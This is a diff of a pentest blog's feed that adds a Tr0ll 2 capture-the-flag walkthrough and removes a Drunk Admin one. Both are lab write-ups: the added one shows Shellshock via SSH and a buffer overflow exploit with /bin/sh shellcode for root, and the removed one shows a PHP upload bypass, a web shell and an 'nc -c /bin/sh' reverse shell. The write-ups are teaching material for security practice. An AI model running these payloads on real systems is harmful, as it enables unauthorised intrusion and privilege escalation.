@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-05-29T05:36:11-04:00</updated>
+  <updated>2017-06-06T10:22:07-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,495 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Tr0ll 2 - There be trolls]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/"/>
+    <updated>2017-06-06T08:58:25-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls</id>
+    <content type="html"><![CDATA[<p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>
+
+<!-- more -->
+
+
+<p>First, a bit of enumeration:</p>
+
+<p>```
+Currently scanning: Finished!   |   Screen View: Unique Hosts</p>
+
+<p> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240</p>
+
+<hr />
+
+<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>
+
+<hr />
+
+<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor            <br/>
+ 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor            <br/>
+ 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor            <br/>
+ 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor <br/>
+```</p>
+
+<p>The IP we want is 192.168.217.129.</p>
+
+<p>```
+nmap -p- -sV -T4 192.168.217.129</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-05-30 10:27 EDT
+Nmap scan report for 192.168.217.129
+Host is up (0.000088s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+MAC Address: 00:0C:29:CB:3D:2E (VMware)
+Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```</p>
+
+<p>You know the drill! Something awaits us on that web server!</p>
+
+<p><img class="center" src="/images/pentest/tr0ll2/troll.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>
+
+<p>And a comment in the source:</p>
+
+<p>``` html</p>
+
+<p><!--Nothing here, Try Harder!>
+<!--Author: Tr0ll>
+<!--Editor: VIM>
+```</p>
+
+<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>
+
+<p><code>
+User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop
+</code></p>
+
+<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>
+
+<p><img class="center" src="/images/pentest/tr0ll2/noob.png" title="&lsquo;noob&rsquo; &lsquo;noob&rsquo;" ></p>
+
+<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>
+
+<p><code>
+ftp 192.168.217.129
+Connected to 192.168.217.129.
+220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+Name (192.168.217.129:root): Tr0ll
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
+226 Directory send OK.
+ftp&gt; get lmao.zip
+local: lmao.zip remote: lmao.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
+226 Transfer complete.
+1474 bytes received in 0.00 secs (8.4682 MB/s)
+</code></p>
+
+<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>
+
+<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>
+
+<p><code>
+ls -l
+total 68
+-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
+-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
+-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
+-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
+-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
+</code></p>
+
+<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>
+
+<p><code>
+Look Deep within y0ur_self for the answer
+</code></p>
+
+<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>
+
+<p><code>
+wc -l answer.txt
+99157 answer.txt
+</code></p>
+
+<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>
+
+<p><code>
+grep -r "_" decoded.txt
+noooob_lol
+</code></p>
+
+<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>
+
+<p><code>
+wc -L decoded.txt
+30 decoded.txt
+</code></p>
+
+<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>
+
+<p>``` python</p>
+
+<h1>!/usr/bin/env python</h1>
+
+<p>import argparse</p>
+
+<p>desc = &ldquo;Find and print lines from a file that are a certain length&rdquo;
+parser = argparse.ArgumentParser(description=desc)</p>
+
+<h1>length argument</h1>
+
+<p>parser.add_argument(</p>
+
+<pre><code>'-l',
+help = 'Length value',
+dest = 'length',
+type = int,
+required=True
+</code></pre>
+
+<p>)</p>
+
+<h1>file add_argument</h1>
+
+<p>parser.add_argument(</p>
+
+<pre><code>'-f',
+help = 'Filename',
+dest = 'filename',
+type = str,
+required=True
+</code></pre>
+
+<p>)</p>
+
+<p>args = parser.parse_args()</p>
+
+<p>with open(args.filename, &ldquo;r&rdquo;) as f:</p>
+
+<pre><code>for line in f.readlines():
+    # strip the newline character for accurate counting
+    if len(line.strip('\n')) == args.length:
+        print line
+</code></pre>
+
+<p>```</p>
+
+<p>Ran it and BOOM:</p>
+
+<p><code>
+python line_length.py -l 30 -f decoded.txt
+ItCantReallyBeThisEasyRightLOL
+</code></p>
+
+<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>
+
+<p><code>
+unzip lmao.zip
+Archive:  lmao.zip
+[lmao.zip] noob password:
+  inflating: noob            
+</code></p>
+
+<p>It looks like it&rsquo;s a private key:</p>
+
+<p><code>
+file noob
+noob: PEM RSA private key
+</code></p>
+
+<p>I tried SSH'ing as noob this time:</p>
+
+<p><code>
+ssh -i noob noob@192.168.217.129
+TRY HARDER LOL!
+Connection to 192.168.217.129 closed.
+</code></p>
+
+<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>
+
+<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>
+
+<p><code>
+ssh -i noob noob@192.168.217.129 -t "() { :; }; pwd"
+/home/noob
+TRY HARDER LOL!
+Connection to 192.168.217.129 closed.
+</code></p>
+
+<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>
+
+<p><code>
+ssh -i noob noob@192.168.217.129 -t "() { :; }; /bin/bash"
+noob@Tr0ll2:~$ uname -a
+Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
+</code></p>
+
+<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>
+
+<h3>Shellshock explained</h3>
+
+<p>Because Bash is a scripting language, you can do things like defining functions:</p>
+
+<p><code>
+myfunction() { echo "I am a function"; }
+</code></p>
+
+<p>And then you call it:</p>
+
+<p><code>
+noob@Tr0ll2:~$ myfunction
+I am a function
+</code></p>
+
+<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>
+
+<p><code>
+noob@Tr0ll2:~$ export -f myfunction
+noob@Tr0ll2:~$ env
+[...]
+myfunction=() {  echo "I am a function"
+}
+</code></p>
+
+<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>
+
+<p><code>
+bash -c myfunction
+I am a function
+</code></p>
+
+<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>
+
+<p><code>
+export shocking='() { echo "This is safe" ; }; echo "This is NOT safe"'
+bash -c shocking
+This is NOT safe
+This is safe
+</code></p>
+
+<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>
+
+<p>Next, the attack fools the shell into accepting a bogus function definition. You can use <a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">this string</a> to see if your bash is vulnerable to Shellshock: <code>x=&lsquo;() { :;}; echo VULNERABLE&rsquo; bash -c :</code>.</p>
+
+<p>Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(<a href="https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b">https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b</a>) that does nothing. So, to the vulnerable shell, the function definition doesn&rsquo;t perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.</p>
+
+<p>Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:</p>
+
+<p><code>
+noob@Tr0ll2:~$ cat .ssh/authorized_keys
+command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
+</code></p>
+
+<p>There it is, the trolling message was the command that user noob was restricted to. Ok, let&rsquo;s move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:</p>
+
+<p><code>
+ls /
+bin   dev  home        lib     media  nothing_to_see_here  proc  run   selinux  sys  usr  vmlinuz
+boot  etc  initrd.img  lost+found  mnt    opt              root  sbin  srv      tmp  var
+</code></p>
+
+<p>Didn&rsquo;t expect to get anything out of this, but..trolls..</p>
+
+<p>```
+noob@Tr0ll2:/$ file nothing_to_see_here/
+nothing_to_see_here/: setuid directory
+noob@Tr0ll2:/$ ls -l nothing_to_see_here/
+total 4
+drwsr-xr-x 5 root root 4096 Oct  4  2014 choose_wisely
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
+door1:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  4  2014 .
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t</p>
+
+<p>door2:
+total 20
+drwsr-xr-x 2 root root 4096 Oct  5  2014 .
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</p>
+
+<p>door3:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  5  2014 .
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
+```</p>
+
+<p>I expanded the list of files in these directories so I could see everything at a glance. Let&rsquo;s see what we have:</p>
+
+<p><code>
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file r00t
+r00t: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0, not stripped
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
+Usage: ./r00t input
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t lol
+lol
+</code></p>
+
+<p>This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:</p>
+
+<p>```
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
+Good job, stand by, executing root shell&hellip;
+BUHAHAHA NOOB!
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$
+Broadcast message from noob@Tr0ll2</p>
+
+<pre><code>(/dev/pts/0) at 12:57 ...
+</code></pre>
+
+<p>The system is going down for reboot NOW!
+Connection to 192.168.217.129 closed by remote host.
+Connection to 192.168.217.129 closed.
+```</p>
+
+<p>Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.</p>
+
+<p>``` plain
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t</p>
+
+<p>2 MINUTE HARD MODE LOL
+```</p>
+
+<p>Wasn&rsquo;t sure what this one did, until I got a permission denied when running ls :&ndash;) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!</p>
+
+<p><code>plain
+Program received signal SIGSEGV, Segmentation fault.
+0x6a413969 in ?? ()
+</code></p>
+
+<p>Let&rsquo;s see where exactly in the pattern it happens:</p>
+
+<p><code>plain
+root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
+[*] Exact match at offset 268
+</code></p>
+
+<p>Taking a closer look at the registers and stack:</p>
+
+<p>``` plain
+(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>
+
+<p>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;B&rsquo; * 4 + &lsquo;C&rsquo; * 16&rdquo;)</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) info r
+eax            0x120    288
+ecx            0x0  0
+edx            0x0  0
+ebx            0xb7fd1ff4   -1208147980
+esp            0xbffffb50   0xbffffb50
+ebp            0x41414141   0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0x42424242   0x42424242
+eflags         0x210286 [ PF SF IF RF ID ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+(gdb) x $esp
+0xbffffb50: 0x43434343
+```</p>
+
+<p>ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the <a href="https://www.exploit-db.com/exploits/40131/">Linux x86 execve /bin/sh</a> shellcode, which is 19 bytes long.</p>
+
+<p>What we have now for a functional exploit:</p>
+
+<ul>
+<li><p>268 bytes to fill the buffer</p></li>
+<li><p>overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code></p></li>
+<li><p>NOP sled for padding</p></li>
+<li><p>shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code></p></li>
+</ul>
+
+
+<p>Ran the exploit in GDB:</p>
+
+<p><code>
+(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
+Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
+process 1838 is executing new program: /bin/dash
+$ id
+uid=1002(noob) gid=1002(noob) groups=1002(noob)
+</code></p>
+
+<p>Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn&rsquo;t work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:</p>
+
+<p>```
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 268 + &ldquo;\x90\xfb\xff\xbf&rdquo; + &ldquo;x90&rdquo; * 16 + &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80&rdquo;&rsquo;)</p>
+
+<h1>id</h1>
+
+<p>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</p>
+
+<h1>ls /root/</h1>
+
+<p>Proof.txt  core1  core2  core3  core4  goal  hardmode  lmao.zip  ran_dir.py  reboot</p>
+
+<h1>cat /root/Proof.txt</h1>
+
+<p>You win this time young Jedi&hellip;</p>
+
+<p>a70354f0258dcc00292c72aab3c8b1e4<br/>
+```</p>
+
+<p>The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!</p>
+
+<p>```
+/ A visit to a fresh place will bring \
+\ strange work.                       /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
@@ -1492,8 +1981,8 @@ Database: seth
 <p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>
 
 <p>``` plain
-ssh -p 777 <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#114;&#x61;&#x6d;&#x73;&#101;&#x73;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x32;&#x31;&#x37;&#46;&#49;&#x33;&#x35;">&#x72;&#97;&#109;&#x73;&#101;&#x73;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#50;&#x31;&#55;&#x2e;&#x31;&#x33;&#53;</a>
-<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x72;&#x61;&#x6d;&#x73;&#x65;&#115;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#50;&#x31;&#55;&#x2e;&#x31;&#x33;&#53;">&#x72;&#97;&#109;&#x73;&#101;&#x73;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x32;&#49;&#55;&#46;&#x31;&#51;&#53;</a>&rsquo;s password:</p>
+ssh -p 777 <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x72;&#x61;&#109;&#115;&#x65;&#x73;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x32;&#x31;&#55;&#x2e;&#49;&#51;&#53;">&#114;&#97;&#x6d;&#x73;&#x65;&#115;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#50;&#x31;&#x37;&#x2e;&#x31;&#x33;&#x35;</a>
+<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#x72;&#97;&#109;&#x73;&#x65;&#x73;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#49;&#x33;&#x35;">&#114;&#97;&#109;&#115;&#101;&#x73;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#50;&#49;&#55;&#46;&#x31;&#x33;&#53;</a>&rsquo;s password:</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -1549,8 +2038,8 @@ adf11c7a9e6523e630aaf3b9b7acb51d</p>
 
 <p>It seems that you have pwned the box, congrats.
 Now you done that I wanna talk with you. Write a walk &amp; mail at
-<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x78;&#x6c;&#x79;&#x30;&#x6e;&#x40;&#x73;&#x69;&#103;&#97;&#105;&#110;&#116;&#46;&#x6f;&#x72;&#103;">&#x78;&#x6c;&#x79;&#x30;&#x6e;&#x40;&#x73;&#105;&#x67;&#97;&#x69;&#x6e;&#x74;&#46;&#x6f;&#114;&#x67;</a> attach the walk and proof.txt
-If sigaint.org is down you may mail at <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#110;&#98;&#115;&#108;&#121;&#x30;&#x6e;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#110;&#98;&#x73;&#108;&#x79;&#x30;&#x6e;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></p>
+<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#120;&#108;&#121;&#48;&#x6e;&#x40;&#115;&#105;&#103;&#x61;&#x69;&#110;&#x74;&#x2e;&#x6f;&#x72;&#x67;">&#120;&#x6c;&#x79;&#48;&#x6e;&#64;&#x73;&#x69;&#x67;&#97;&#x69;&#110;&#116;&#46;&#111;&#114;&#103;</a> attach the walk and proof.txt
+If sigaint.org is down you may mail at <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6e;&#x62;&#x73;&#108;&#x79;&#48;&#x6e;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#110;&#x62;&#x73;&#108;&#x79;&#x30;&#110;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a></p>
 
 <p>USE THIS PGP PUBLIC KEY</p>
 
@@ -2065,231 +2554,6 @@ mr.pr0n || p0wnbox.Team || 2011
 </code></pre>
 
 <p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
-    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
-    <updated>2016-06-12T11:51:50-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
-    <content type="html"><![CDATA[<h1>Mission statement</h1>
-
-<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>
-
-<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>
-
-<!-- more -->
-
-
-<h1>Recon</h1>
-
-<p>Started with an Nmap scan, I only keep here the relevant output:</p>
-
-<p><code>plain
-PORT     STATE SERVICE REASON         VERSION
-22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
-8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))
-</code></p>
-
-<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/tripios.png" title="&lsquo;tripios&rsquo; &lsquo;tripios image hosting&rsquo;" ></p>
-
-<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
-<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>
-
-<h1>Exploit</h1>
-
-<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>
-
-<p><img class="center" src="/images/pentest/drunkadmin/upload.png" title="&lsquo;upload&rsquo; &lsquo;uploaded image&rsquo;" ></p>
-
-<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>
-
-<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>
-
-<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>
-
-<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>
-
-<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>
-
-<p>With this information, I made another simple script to see if I can get command execution on the target:</p>
-
-<p><code>php
-&lt;?php
-echo exec($_GET['cmd']);
-?&gt;
-</code></p>
-
-<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>
-
-<p><code>php
-echo exec('whoami');
-</code></p>
-
-<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>
-
-<p><code>php
-echo exec($_REQUEST['cmd']);
-</code></p>
-
-<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>
-
-<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>
-
-<p><code>plain
-root@pwnbox:~#nc -vvnlp 5555
-listening on [any] 5555 ...
-connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
-ls /home
-bob
-ls /home/bob/
-Documents
-public_html
-</code></p>
-
-<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>
-
-<p><code>plain
-ls -a /var/www
-.
-..
-.htaccess
-.proof
-image.php
-images
-index.php
-info.php
-myphp.php
-style
-upload.php
-xmm.html
-</code></p>
-
-<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>
-
-<p>``` plain
-cat .proof</p>
-
-<h6>#</h6>
-
-<h1>Drunk Admin Challenge</h1>
-
-<h1>by @anestisb</h1>
-
-<h6>#</h6>
-
-<p>bob> Great work.
-bob> Meet me there.
-&hellip;> ?
-bob> What? You don&rsquo;t know where?
-bob> Work a little more your post</p>
-
-<pre><code> exploitation skills.
-</code></pre>
-
-<p>Secret Code:
-TGglMUxecjJDSDclN1Ej</p>
-
-<p>Mail me your methods at:
